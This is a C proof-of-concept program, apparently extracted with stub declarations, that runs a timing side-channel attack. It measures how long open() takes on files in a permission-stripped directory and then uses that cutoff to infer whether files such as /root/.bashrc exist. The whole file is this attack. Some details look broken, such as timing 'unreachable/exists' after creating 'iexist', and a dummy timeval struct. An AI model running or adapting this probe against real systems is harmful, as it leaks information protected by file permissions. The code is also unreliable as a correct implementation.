
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct timeval {int dummy; } ;


 int EXIT_FAILURE ;
 int atexit (int ) ;
 int chmod (char*,int) ;
 int cleanup ;
 int close (int) ;
 int creat (char*,int) ;
 int exit (int ) ;
 int fflush (int ) ;
 int flags ;
 int gettimeofday (struct timeval*,int *) ;
 int mkdir (char*,int) ;
 int open (char*,int ) ;
 int printf (char*,...) ;
 int stdout ;
 int system (char*) ;
 unsigned int tv_diff (struct timeval*,struct timeval*) ;

int main(int argc, char **argv)
{
 struct timeval tv_a, tv_b;
 int fd_a, fd_b;
 char buf_a[500], buf_b[500];

 unsigned int success, n, failure;

 atexit(cleanup);

 printf("[+] creating unreachable\n");
 if(mkdir("unreachable", 0700)==-1) {
  printf("\t[-] Unable to create unreachable\n");
  exit(EXIT_FAILURE);
 }

 printf("[+] creating unreachable/iexist\n");
 if((fd_a = creat("unreachable/iexist", 0700))==-1) {
  printf("\t[-] Unable to create unreachable/iexist\n");
  exit(EXIT_FAILURE);
 }
 close(fd_a);

 printf("[+] chmod 0'ing unreachable\n");
 if(chmod("unreachable", 00)==-1) {
  printf("\t[-] Unable to chmod unreachable\n");
  exit(EXIT_FAILURE);
 }

 printf("[+] "); fflush(stdout);

 system("ls -alF | grep unreachable");

 printf("[+] Timing open() on unreachable/iexist\n");




 gettimeofday(&tv_a, ((void*)0));
 fd_a = open("unreachable/exists", flags);
 gettimeofday(&tv_b, ((void*)0));


 printf("\t[+] Successful: %ld usecs, got %m\n", (success = tv_diff(&tv_b, &tv_a)));
 close(fd_a);

 printf("[+] Timing open() on unreachable/non-existant\n");




 gettimeofday(&tv_a, ((void*)0));
 fd_b = open("unreachable/non-existant", flags);
 gettimeofday(&tv_b, ((void*)0));


 printf("\t[+] Failure: %ld usecs, got %m\n", (failure = tv_diff(&tv_b, &tv_a)));

 close(fd_b);
 success += tv_diff(&tv_b, &tv_a);

 success /= 3;


 if(failure > success || success > (failure*8) ) {
  printf("[-] It appears the load went up unexpectadly, mebe try re-running?\n");
  exit(EXIT_FAILURE);
 }



 if((failure*4) >= success) success--;
 if(success <= (failure*3)) success++;

 printf("\t[+] Using %d as our cutoff.\n", success);
 printf("[+] testing /root/.bashrc and /root/non-existant\n");




 gettimeofday(&tv_a, ((void*)0));
 fd_a = open("/root/.bashrc", flags);
 gettimeofday(&tv_b, ((void*)0));

 if((n = tv_diff(&tv_b, &tv_a)) >= success) {
  printf("\t[+] /root/.bashrc exists (%d usecs), got %m\n", n);
 } else {
  printf("\t[+] /root/.bashrc doesn't exist (%d usecs), got %m\n", n);
 }
 close(fd_a);




 gettimeofday(&tv_a, ((void*)0));
 fd_b = open("/root/non-existant", flags);
 gettimeofday(&tv_b, ((void*)0));

 if((n = tv_diff(&tv_b, &tv_a)) >= success) {
  printf("\t[+] /root/non-existant exists (%d usecs), got %m\n", n);
 } else {
  printf("\t[+] /root/non-existant doesn't exist (%d usecs), got %m\n", n);
 }

 close(fd_b);
}
